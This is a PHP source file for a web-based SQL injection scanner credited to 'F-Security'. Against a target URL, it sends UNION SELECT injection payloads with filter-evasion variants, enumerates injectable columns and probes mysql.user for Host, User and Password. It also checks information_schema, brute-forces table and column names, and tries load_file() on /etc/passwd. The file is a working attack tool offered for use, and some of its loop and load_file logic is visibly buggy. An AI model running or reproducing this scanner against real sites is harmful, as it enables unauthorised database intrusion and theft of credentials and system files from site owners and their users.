<?php
@set_time_limit(0);
/*
F-Security - Sql InyeXion Scanner v1
Desarrollado por Knet
Adminitradores - www.remoteexecution.org
Contacto:
Keynet.security@Gmail.com [ Mail ]
Keynet.security@Hotmail.com [ Msn ]
*/
$web=$_POST['web'];
$end=$_POST['end'];
$scann=$_POST['scann'];
$union=$_POST['union'];
$max=$_POST['max'];
$from_format=$_POST['from'];
$MySqluser=$_POST['MySqluser'];
$InforMationSchema=$_POST['InforMationSchema'];
$TblBrt=$_POST['TblBrt'];
$TblFormat=$_POST['TblFormat'];
$ColBrt=$_POST['ColBrt'];
$ColFormat=$_POST['ColFormat'];
$LdFl=$_POST['LdFl'];
$string='err0r';
$union_array=array(
'-1+UNION+SELECT+',
'-1\'+UNION+SELECT+',
'-1+UNION+ALL+SELECT+',
'-1\'+UNION+ALL+SELECT+',
'-1/**/UNION/**/SELECT/**/',
'-1\'/**/UNION/**/SELECT/**/',
'-1/**/UNION/**/ALL/**/SELECT/**/',
'-1\'/**/UNION/**/ALL/**/SELECT/**/',
'1+UNION+SELECT+',
'1\'+UNION+SELECT+',
'1+UNION+ALL+SELECT+',
'1\'+UNION+ALL+SELECT+',
'1/**/UNION/**/SELECT/**/',
'1\'/**/UNION/**/SELECT/**/',
'1/**/UNION/**/ALL/**/SELECT/**/',
'1\'/**/UNION/**/ALL/**/SELECT/**/'
);
$count_union_array=count($union_array) + 1;
$from_array=array(
'+from+',
'/**/from/**/',
'+FROM+',
'/**/FROM/**/',
'%20from%20',
'%20FROM%20'
);
$count_from_array=count($from_array) + 1;
$from=$from_array[$from_format];
$iny_1=$union_array[$union];
$iny_2='0x'.bin2hex($string);
$iny_3='0x'.bin2hex($string);
if($max<3 || $max=="" || !is_numeric($max))
{
$max=3;
}
?>
<form action="" method="POST">
<table>

<center><h1>--[ Sql InyeXion Scanner F-Security Team ]--</h1></center>

<link rel="stylesheet" type="text/css" href="../../../css/default1.css" />

<tr>
<td>Web:
<input id="boton" type="text" name="web" value="
<?php if($web!=""){echo htmlentities($web);}else{echo 'http://www.site.com/news.php?id=';} ?>
" size="60">
</td>
<td>Union*:
<SELECT name="union" size="1" id="boton">
<?php
for($union_for=0;$union_for<=$count_union_array;$union_for++)
{
if($union_array[$union_for]!="")
{
echo '<OPTION VALUE="'.$union_for.'">'.$union_array[$union_for].'</OPTION>'."\n";
}
}
?>
</SELECT>
<td>Max columns:
<SELECT name="max" size="1" id="boton">
<?php
for($max_a=1;$max_a<=255;$max_a++)
{
echo '<OPTION VALUE="'.$max_a.'">'.$max_a.'</OPTION>'."\n";
}
?>
</SELECT>
</td>
<td>eND:
<input id="boton" type="text" name="end" value="
<?php if($end!=""){echo htmlentities($end);}else{echo '--';} ?>" size="10">
</td>
</tr>
</table>
<table>
<tr>
<td>From* Format:
<td>
<SELECT name="from" size="1" id="boton">
<?php
for($from_for=0;$from_for<=$count_from_array;$from_for++)
{
if($from_array[$from_for]!="")
{
echo '<OPTION VALUE="'.$from_for.'">'.$from_array[$from_for].'</OPTION>'."\n";
}
}
?>
</SELECT>
</td>
</tr>
</table>
<table>
<tr>
<td>Test mysql.user:</td>
<td>Yes</td>
<td><input type="radio" name="MySqluser" value="S" checked></td>
<td>No</td>
<td><input type="radio" name="MySqluser" value="N"></td>
</tr>
<tr>
<td>Test information_schema:</td>
<td>Yes</td>
<td><input name="InforMationSchema" type="radio" value="S" checked="checked"></td>
<td>No</td>
<td><input type="radio" name="InforMationSchema" value="N"></td>
</tr>
<tr>
<td>Tables BruteForce:</td>
<td>Yes</td>
<td><input name="TblBrt" type="radio" value="S" checked="checked"></td>
<td>No</td>
<td><input type="radio" name="TblBrt" value="N"></td>
<td>|</td>
<td>tablename</td>
<td><input type="radio" name="TblFormat" value="1" checked></td>
<td>|</td>
<td>TableName</td>
<td><input type="radio" name="TblFormat" value="2"></td>
<td>|</td>
<td>TABLENAME</td>
<td><input type="radio" name="TblFormat" value="3"></td>
</tr>
<tr>
<td>Columns BruteForce:</td>
<td>Yes</td>
<td><input name="ColBrt" type="radio" value="S" checked="checked"></td>
<td>No</td>
<td><input type="radio" name="ColBrt" value="N"></td>
<td>|</td>
<td>columname</td>
<td><input type="radio" name="ColFormat" value="1" checked></td>
<td>|</td>
<td>ColumName</td>
<td><input type="radio" name="ColFormat" value="2"></td>
<td>|</td>
<td>COLUMNAME</td>
<td><input type="radio" name="ColFormat" value="3"></td>
</tr>
<tr>
<td>Test load_file():</td>
<td>Yes</td>
<td><input type="radio" name="LdFl" value="S" checked></td>
<td>No</td>
<td><input type="radio" name="LdFl" value="N"></td>
</tr>
<tr>
<td><input id="boton" type="submit" name="scann" value="Scann"></td>
</tr>
</table>
<table>
<tr>
<td>
<?php
if(isset($scann) && $web!="")
{
for($a_for=1;$a_for<=$max;$a_for++)
{
$iny_2=$iny_2.'2d'.bin2hex($a_for);
$iny=$web.$iny_1.$iny_2;
$webmas = $iny;
$contenido = @file_get_contents($webmas.$end);
$alert = strpos($contenido,$string);
if(!$alert)
{
$iny_2=$iny_2.','.$iny_3;
$iny_vuln .= $a_for.',';
}
else
{
$f_num=$a_for;
$web_final=$web.$iny_1.$iny_vuln.$f_num;
//echo $webmas;
echo '[+] Bug Found in: '.$a_for."<br>".'<a href="'.htmlentities($web_final.$end).
'" TARGET=BLANK>'.htmlentities($web_final.$end).'</a>'."<br>";
echo 'vuln in num/s: |';
/*********************************SALVANDO***************************************/
$_SESSION['all_saveds'] .= '[+] Bug Found in: '.$a_for.
"<br>".'<a href="'.htmlentities($web_final.$end).
'" TARGET=BLANK>'.htmlentities($web_final.$end).'</a>'."<br>".'vuln in num/s: |';
/*********************************SALVANDO***************************************/
$vulns=array();
for($search_for=1;$search_for<=$a_for;$search_for++)
{
if(strpos($contenido,$string.'-'.$search_for))
{
echo $search_for.'|';
/*********************************SALVANDO**********************
*****************/
$_SESSION['all_saveds'] .= $search_for.'|';
/*********************************SALVANDO**********************
*****************/
array_push($vulns,$search_for);
}
}
/*********************************SALVANDO***************************************/
$_SESSION['all_saveds'] .= "<br>".'---------------------------------------------'.
'------------------------------------------------'."<br>";
/*********************************SALVANDO***************************************/
echo "<br>".'---------------------------------------------'.
'------------------------------------------------'."<br>";
$a_for=$max;
define('vuln','yes');
}
if(!$alert && $a_for==$max)
{
echo 'no vuln in 1->'.$max."\n";
}
$contenido='';
}
}
/* FINAL SIMPLE SCANN */
if(vuln=="yes" && isset($MySqluser) && $MySqluser=="S")
{
$from_mysql_user=$from.'mysql.user';
$contenido = @file_get_contents($webmas.$from_mysql_user.$end);
$alert_mysql_user = strpos($contenido,$string);
if($alert_mysql_user)
{
echo '[+] MySQL Database Found:'.'<br>';
echo '<a href="'.htmlentities($web_final.$from_mysql_user.$end).'" TARGET=BLANK>'.
htmlentities($web_final.$from_mysql_user.$end).'</a>'."<br>";
echo '[+] Columns default in mysql.user: Host,User,Password'.'<br>';
}
else
{
echo '[+] MySQL Database not Found:'.'<br>';
}
echo '-------------------------------'."<br>";
}
/* FINAL Mysql.user TEST */
if(vuln=="yes" && isset($InforMationSchema) && $InforMationSchema=="S")
{
$from_information_schema=$from.'information_schema.tables';
$contenido = @file_get_contents($webmas.$from_information_schema.$end);
$alert_information_schema = strpos($contenido,$string);
if($alert_information_schema)
{
echo '[+] Information_Schema Database Found:'.'<br>';
echo '<a href="'.htmlentities($web_final.$from_information_schema.$end).'" TARGET=BLANK>'.
htmlentities($web_final.$from_information_schema.$end).'</a>'."<br>";
echo '[+] Columns default in information_schema.tables: TABLE_SCHEMA,TABLE_NAME'.'<br>';
echo '---------------'."<br>";
echo '[+] Columns default in information_schema.columns:
TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME'.'<br>';
}
else
{
echo '[+] Information_Schema Database not Found:'.'<br>';
}
echo '-------------------------------'."<br>";
}
/* FINAL information_schema database */
if(vuln=="yes" && isset($TblBrt) && $TblBrt=="S" && isset($TblFormat))
{
switch($TblFormat)
{
case 1:
$file_txt_tables='1.txt';
break;
case 2:
$file_txt_tables='2.txt';
break;
case 3:
$file_txt_tables='3.txt';
break;
default:
$file_txt_tables='1.txt';
}
$file_tables=@file($file_txt_tables);
$count_tables=count($file_tables);
for($t_for=0;$t_for<=$count_tables;$t_for++)
{
$file_tables[$t_for]=trim($file_tables[$t_for]);
if($file_tables[$t_for] != "")
{
$from_table=$from.$file_tables[$t_for];
$contenido = @file_get_contents($webmas.$from_table.$end);
$alert_table = strpos($contenido,$string);
if($alert_table)
{
echo '[+] Table Found: '.$file_tables[$t_for]."<br>";
echo '<a href="'.htmlentities($web_final.$from_table.$end).'" TARGET=BLANK>'.
htmlentities($web_final.$from_table.$end).'</a>'."<br>";
/*
echo 'webmas:'.$webmas.'<br>';
echo 'webfinal:'.$web_final.'<br>';
echo 'web:'.$web.'<br>';
*/
if(isset($ColBrt) && $ColBrt=="S" && isset($ColFormat))
{
/****************************************************************
*******/
switch($ColFormat)
{
case 1:
$file_txt_columns='1.txt';
break;
case 2:
$file_txt_columns='2.txt';
break;
case 3:
$file_txt_columns='3.txt';
break;
default:
$file_txt_columns='1.txt';
}
$file_columns=@file($file_txt_columns);
$count_columns=count($file_columns);
$count_vulns=count($vulns);
$count_vulns = $count_vulns + 1;
for($c_for=0;$c_for<=$count_columns;$c_for++)
{
$file_columns[$c_for]=trim($file_columns[$c_for]);
if($file_columns[$c_for] != "")
{
for($cols_for=1;$cols_for<=$f_num;$cols_for++)
{
if(in_array($cols_for,$vulns))
{
if($cols_for != $f_num)
{
$cols_brt_string .= 'concat(0x'.bin2hex($string).
','.
$file_columns[$c_for].'),';
}
else
{
$cols_brt_string .= 'concat(0x'.bin2hex($string).
','.
$file_columns[$c_for].')';
}
}
else
{
if($cols_for != $f_num)
{
$cols_brt_string .= $cols_for.',';
}
else
{
$cols_brt_string .= $cols_for;
}
}
}
$col_contenido=@file_get_contents($web.
$iny_1.$cols_brt_string.$from_table.$end);
$alert_col = strpos($col_contenido,$string);
if($alert_col)
{
if($cols_vulns=="")
{
$cols_vulns =
$file_columns[$c_for];
}
else
{
$cols_vulns .= ','.
$file_columns[$c_for];
}
/*
$cols_brt_string=str_replace('concat(0x'.bin2hex($string).',','',
$cols_brt_string);
$cols_brt_string=str_replace(')','',
$cols_brt_string);
echo '[+] Column Found in '.
$file_tables[$t_for].
': '.$file_columns[$c_for].'<br>';
echo '<a href="'.
htmlentities($web.
$iny_1.$cols_brt_string.$from_table.$end).'" TARGET=BLANK>'.
htmlentities($web.
$iny_1.$cols_brt_string.$from_table.$end).'</a>'."<br>";
*/
}
$cols_brt_string='';
}/**/
}
if($cols_vulns!="")
{
echo '[+] Column/s Found in '.$file_tables[$t_for].' : '.
$cols_vulns.'<br>';
$cols_vulns='';
}
/****************************************************************
*******/
}
echo '-------------------------------'."<br>";
}
}
}
}
/* FINAL TABLE AND COLUMNS BRUTEFORCE */
if(vuln=="yes" && isset($LdFl) && $LdFl=="S")
{
$string_alert_loadfile = 'root:x:';
for($load_file_for=1;$load_file_for<=$f_num;$load_file_for++)
{
if(in_array($load_file_for,$vulns) && load_file!="yes")
{
if($load_file_for != $f_num)
{
$load_file_string .= 'load_file(0x'.bin2hex('/etc/passwd').')'.',';
}
else
{
$load_file_string .= 'load_file('.$load_file_for.')';
}
define('load_file','yes');
}
else
{
if($load_file_for != $f_num)
{
$load_file_string .= $load_file_for.',';
}
else
{
$load_file_string .= $load_file_for;
}
}
}
$web_load=$web.$iny_1.$load_file_string.$end;
$contenido_load = @file_get_contents($web_load);
$alert_load_file = strpos($contenido_load,$string_alert_loadfile);
echo '[+] load_file(): ';
if($alert_load_file)
{
echo 'ENABLED'.'<br>';
echo '<a href="'.htmlentities($web_load).'" TARGET=BLANK>'.
htmlentities($web_load).'</a>'."<br>";
}
else
{
echo 'DISABLED'.'<br>';
}
echo '-------------------------------'."<br>";
}
/* FINAL LOAD_FILE() TEST */
?>
